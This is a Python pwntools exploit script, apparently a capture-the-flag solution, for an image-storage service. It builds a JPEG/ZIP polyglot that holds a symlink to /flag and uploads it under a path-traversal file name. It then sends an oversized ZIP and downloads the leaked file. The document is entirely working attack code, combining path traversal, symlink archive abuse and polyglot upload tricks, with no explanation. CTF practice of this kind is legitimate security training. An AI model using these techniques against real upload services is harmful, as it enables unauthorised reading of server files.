import os
import subprocess
from pwn import *

SMALL_JPEG = b''
SMALL_JPEG += b'\xff\xd8'  # SOI
SMALL_JPEG += b'\xff\xe0'  # APP0
SMALL_JPEG += b'\x00\x10'
SMALL_JPEG += b'\x4a\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00'
SMALL_JPEG += b'\xff\xdb'  # DQT
SMALL_JPEG += b'\x00\x43'
SMALL_JPEG += b'\x00'
SMALL_JPEG += b'\x03\x02\x02\x02\x02\x02\x03\x02'
SMALL_JPEG += b'\x02\x02\x03\x03\x03\x03\x04\x06'
SMALL_JPEG += b'\x04\x04\x04\x04\x04\x08\x06\x06'
SMALL_JPEG += b'\x05\x06\x09\x08\x0a\x0a\x09\x08'
SMALL_JPEG += b'\x09\x09\x0a\x0c\x0f\x0c\x0a\x0b'
SMALL_JPEG += b'\x0e\x0b\x09\x09\x0d\x11\x0d\x0e'
SMALL_JPEG += b'\x0f\x10\x10\x11\x10\x0a\x0c\x12'
SMALL_JPEG += b'\x13\x12\x10\x13\x0f\x10\x10\x10'
SMALL_JPEG += b'\xff\xc9'  # SOF
SMALL_JPEG += b'\x00\x0b'
SMALL_JPEG += b'\x08\x00\x01\x00\x01\x01\x01\x11\x00'
SMALL_JPEG += b'\xff\xcc'  # DAC
SMALL_JPEG += b'\x00\x06\x00\x10\x10\x05'
SMALL_JPEG += b'\xff\xda'  # SOS
SMALL_JPEG += b'\x00\x08'
SMALL_JPEG += b'\x01\x01\x00\x00\x3f\x00\xd2\xcf\x20'
SMALL_JPEG += b'\xff\xd9'  # EOI

SMALL_ZIP = b'PK\x05\x06' + 18 * b'\x00'

HOST = os.environ.get("HOST", "imagestore2.challs.teamitaly.eu")
PORT = int(os.environ.get("PORT", 15013))

conn = remote(HOST, PORT)

conn.recvuntil(b'> ')
conn.send(b'1\n')  # upload an image

initial_path = os.getcwd()
os.chdir('/tmp')

try:
    os.remove('file.zip')
    os.remove('flag')
except:
    pass

subprocess.run(['ln', '-s', '/flag', 'flag'])
subprocess.run(['zip', '--symlinks', 'file.zip', 'flag'])

with open('file.zip', 'rb') as zipfile:
    content = zipfile.read()

os.remove('file.zip')
os.remove('flag')

os.chdir(initial_path)

payload = b64e(SMALL_JPEG + content).encode()

conn.recvuntil(b': ')  # image name
conn.send(b'../../tmp/images.zip.zip\n')

conn.recvuntil(b': ')  # image/zip polyglot payload
conn.send(payload + b'\n')

conn.recvuntil(b'> ')
conn.send(b'4\n')  # upload multiple images

payload = b64e(SMALL_ZIP + 100000 * b'A').encode()

conn.recvuntil(b': ')  # zip payload
conn.send(payload + b'\n')

conn.recvuntil(b'> ')
conn.send(b'2\n')  # download an image

conn.recvuntil(b'> ')
conn.send(b'0\n')  # flag
conn.recvuntil(b'\n')

flag = b64d(conn.recvuntil(b'\n')).decode()

conn.close()

# Print the flag to stdout
print("FLAG:", flag)
